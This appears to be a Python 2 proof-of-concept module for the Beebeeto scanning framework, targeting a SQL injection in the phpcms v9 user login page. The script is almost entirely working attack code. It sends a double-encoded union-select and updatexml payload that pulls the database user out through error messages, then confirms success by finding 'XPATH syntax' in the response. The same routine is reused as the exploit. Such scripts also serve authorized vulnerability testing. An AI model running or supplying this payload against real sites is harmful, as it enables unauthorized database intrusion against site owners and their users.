#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc':{
            'id': 'poc-2015-0127',
            'name': 'phpcms v9 User login /index.php SQL injection POC',
            'author': 'ali',
            'create_date': '2015-08-09',
            },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
            },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpcms',
            'vul_versiosn': ['v9'],
            'type': 'SQL Injection',
            'tag': ['phpcms v9漏洞', 'sql injection', '/index.php?m=menber&c=index&a=login'],
            'desc': 'phpcms v9用户登录处存在sql注入漏洞',
            'references': ['http://0day5.com/archives/3266'],
            },
    }

    @classmethod
    def verify(cls, args):
        payload = ('/index.php?m=menber&c=index&a=login')
        verify_url = args['options']['target'] + payload
        data = ("dosubmit=1&username=phpcms&password=123456%26username%3d%2527%2b"
                "union%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml"
                "(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)"
                "%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c"
                "%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527"
                "%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527"
                "%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c"
                "%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f"
                "%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull"
                "%252cnull%252cnull%252cnull%252cnull%252cnull%2523")
        req = urllib2.urlopen(verify_url, data)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = req.read()
        if "XPATH syntax" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = args['options']['target']
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint
    mp = MyPoc()

    pprint(mp.run())
